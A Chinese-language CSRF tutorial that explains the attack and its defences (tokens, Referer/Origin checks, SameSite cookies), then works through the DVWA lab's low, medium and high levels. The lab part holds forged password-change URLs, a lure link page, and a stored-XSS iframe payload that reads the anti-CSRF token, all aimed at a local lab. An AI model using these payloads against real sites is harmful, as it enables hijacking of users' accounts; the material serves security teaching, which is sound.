# 简介

CSRF，全名 Cross Site Request Forgery，跨站请求伪造。本质是通过伪装成受信任用户请求受信任的网站。

## CSRF 攻击的原理

1. **用户登录受信任网站**：用户在浏览器中登录了A网站，并建立了有效会话。
2. **未退出登录**：用户在会话有效期间访问了B网站。
3. **恶意网站发送请求**：B网站向受信任网站发送伪造的请求，利用用户的会话 cookie 等身份验证信息。
4. **受信任网站执行请求**：由于浏览器会自动携带受信任网站的 cookie，服务器误认为请求是用户主动发起的，从而执行恶意操作。

# 防护措施

## 1. 使用 CSRF 令牌（Token）

**示例代码（HTML 表单）**：

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
  <button type="submit">转账</button>
</form>
```

**后端验证（Python）**：

```python
def verify_csrf(request):
    client_token = request.form.get('csrf_token')
    server_token = session.get('csrf_token')
    if client_token != server_token:
        abort(403)  # 拒绝请求
```

## 2. 同源验证（Same-Origin Policy）

通过检查请求来源，确保请求来自同一域名：

- **验证 Referer 头**：检查 HTTP 请求的`Referer`字段是否与当前域名匹配。
- **验证 Origin 头**：检查跨域请求的`Origin`字段是否为可信域名。

### Referer 头与Origin 头是什么？

**Referer 头**

- **作用**：指示请求是从哪个 URL 发起的，包含完整路径（但不包含查询参数和片段）。

- **示例**:

  用户从

  ```
  https://example.com/post/1
  ```

  点击链接访问

  ```
  https://example.com/comments
  ```

  则后者的请求头中会包含

  ```plaintext
  Referer: https://example.com/post/1
  ```

**Origin 头**（浏览器强制加上去，但能用bp改）

- **作用**：指示请求的源站，仅包含协议、域名和端口（不包含路径）。

- **示例：**

  从

  ```
  https://example.com
  ```

  发起的请求到

  ```
  https://api.example.com
  ```

  请求头会包含：

  ```plaintext
  Origin: https://example.com
  ```

## 3. 设置 Cookie 的 SameSite 属性

通过`SameSite`属性控制 Cookie 在跨站请求时的发送：

- **Strict**：仅允许同源请求携带 Cookie。
- **Lax**：允许部分安全的跨站请求（如 GET 请求）携带 Cookie。
- **None**：允许所有跨站请求携带 Cookie（需配合`Secure`属性）。

**示例代码（Python Flask）**：

```python
@app.after_request
def add_cookie_policy(response):
    response.set_cookie('session_id', value=session_id, 
                        samesite='Lax',  # 推荐使用Lax
                        secure=True,     # 仅HTTPS传输
                        httponly=True)   # 防止JS访问Cookie
    return response
```

# 练习

靶场用的是DVWA   ```https://github.com/digininja/DVWA```

## low

![image-20250510185840301](image-20250510185840301.png)

![image-20250510185337277](image-20250510185337277.png)

直接看源码

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

通过get得到三个参数change、password_new、password_conf，password_new和password_conf想同则修改，没有任何防护

构造链接

```
http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#
```

![image-20250510190548161](image-20250510190548161.png)

也可以制作页面，诱导用户点击

```html
<a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#"><img src="">点击重试</a>
```

## medium

看源码

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $current_user = dvwaCurrentUser();
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

使用了 Referer 验证，因为是本地搭建怎么提交referer都是127.0.0.1

绕过可以通过重定向的方式，用js

```html
<script>window.location = "http://127.0.0.1/"</script>
```

## heigh

看源码

``` php
<?php

$change = false;
$request_type = "html";
$return_message = "Request Failed";

if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {
  $data = json_decode(file_get_contents('php://input'), true);
  $request_type = "json";
  if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
    array_key_exists("password_new", $data) &&
    array_key_exists("password_conf", $data) &&
    array_key_exists("Change", $data)) {
    $token = $_SERVER['HTTP_USER_TOKEN'];
    $pass_new = $data["password_new"];
    $pass_conf = $data["password_conf"];
    $change = true;
  }
} else {
  if (array_key_exists("user_token", $_REQUEST) &&
    array_key_exists("password_new", $_REQUEST) &&
    array_key_exists("password_conf", $_REQUEST) &&
    array_key_exists("Change", $_REQUEST)) {
    $token = $_REQUEST["user_token"];
    $pass_new = $_REQUEST["password_new"];
    $pass_conf = $_REQUEST["password_conf"];
    $change = true;
  }
}

if ($change) {
  // Check Anti-CSRF token
  checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );

  // Do the passwords match?
  if( $pass_new == $pass_conf ) {
    // They do!
    $pass_new = mysqli_real_escape_string ($GLOBALS["___mysqli_ston"], $pass_new);
    $pass_new = md5( $pass_new );

​    // Update the database
​    $current_user = dvwaCurrentUser();
​    $insert = "UPDATE `users` SET password = '" . $pass_new . "' WHERE user = '" . $current_user . "';";
​    $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert );

​    // Feedback for the user
​    $return_message = "Password Changed.";
  }
  else {
​    // Issue with passwords matching
​    $return_message = "Passwords did not match.";
  }

  mysqli_close($GLOBALS["___mysqli_ston"]);

  if ($request_type == "json") {
    generateSessionToken();
    header ("Content-Type: application/json");
    print json_encode (array("Message" =>$return_message));
    exit;
  } else {
    echo "<pre>" . $return_message . "</pre>";
  }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

多了个**user_token**

>  CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。

需要用到存储型XSS，这个界面就有XSS

![image-20250510203601545](image-20250510203601545.png)

有字数限制，先改字数，再上传

![image-20250510204114263](image-20250510204114263.png)

 ```js
 <iframe src="http://127.0.0.1/DVWA/vulnerabilities/csrf/index.php"onload=alert(frames[0].document.getElementsByName('user_token')[0].value)></iframe>
 ```

会弹出它的**user_token**

获得user_token后再用上面的方法

```
http://127.0.0.1/DVWA/vulnerabilities/csrf/index.php?password_new=1&password_conf=1&Change=Change&user_token=ee164777d981c0d56060b22569c6b81f#
```

























